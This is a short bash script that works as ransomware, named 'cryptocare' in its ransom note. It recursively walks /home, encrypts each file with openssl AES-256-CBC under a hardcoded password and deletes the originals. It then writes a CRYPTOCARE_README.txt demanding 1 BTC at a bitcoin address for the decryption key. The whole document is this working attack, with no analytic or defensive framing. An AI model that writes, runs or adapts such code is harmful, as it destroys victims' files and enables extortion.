#!/bin/bash
s='/'
enc=".enc"
curDir='/home'
done=0
directories=('/home/')
dirFound=0
found=0
function encrypt {
  echo "encrypting $1"
  openssl enc -aes-256-cbc -salt -in "$1" -out "$1$enc" -k privateSecret
  rm -f "$1"
}
function search {
  found=0
  for i in $( ls $1 ); do
    if [ -d "$1$s$i" ] ; then
      echo "$1$s$i is a directory"
      directories+=("$1$s$i")
      found=1
    else
      if [ -f "$1$s$i" ]; then
        echo "$1$s$i is a file"
        encrypt "$1$s$i"
      else
        echo "$1$s$i is not valid"
      fi
    fi
    if [ "$found" = 1 ]; then
      let "done++"
      search ${directories[$done]}
    fi
  done
  echo "Your computer has been taken hostage by cryptocare.\r\nSend 1 BTC to 1BDS9x6x3hNcKFQaHbBUYMLxCfxXj7qpiG to receive the decryption key." >> CRYPTOCARE_README.txt
}
search "$curDir"